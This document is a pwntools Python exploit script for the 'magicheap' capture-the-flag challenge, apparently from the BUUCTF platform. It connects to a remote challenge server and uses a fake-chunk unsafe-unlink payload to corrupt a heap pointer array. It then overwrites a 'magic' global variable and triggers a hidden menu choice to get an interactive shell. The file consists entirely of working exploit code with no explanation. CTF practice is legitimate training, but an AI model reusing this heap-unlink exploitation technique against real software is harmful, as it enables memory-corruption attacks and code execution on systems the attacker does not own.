from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('magicheap')
io = remote('node4.buuoj.cn', 26407)
elf = ELF('magicheap')
heaparray = 0x6020C0
magic = 0x6020A0

def add(size, content):
	io.sendlineafter('Your choice :', '1')
	io.sendlineafter('Size of Heap : ', str(size))
	io.sendafter('Content of heap:', content)


def edit(index, size, content):
	io.sendlineafter('Your choice :', '2')
	io.sendlineafter('Index :', str(index))
	io.sendlineafter('Size of Heap : ', str(size))
	io.sendafter('Content of heap : ', content)


def delete(index):
	io.sendlineafter('Your choice :', '3')
	io.sendlineafter('Index :', str(index))


def unlink():
	add(0x20, 'a\n')
	add(0x80, 'b\n')
	fd, bk = heaparray - 0x18, heaparray - 0x10
	payload = p64(0) + p64(0x21) + p64(fd) + p64(bk) + p64(0x20) + p64(0x90)
	edit(0, 0x30, payload)
	delete(1)


def pwn():
	payload = cyclic(0x18) + p64(magic)
	edit(0, 0x20, payload)
	edit(0, 8, p64(0x1306))
	io.sendlineafter('Your choice :', '4869')
	io.interactive()


if __name__ == '__main__':
	unlink()
	pwn()
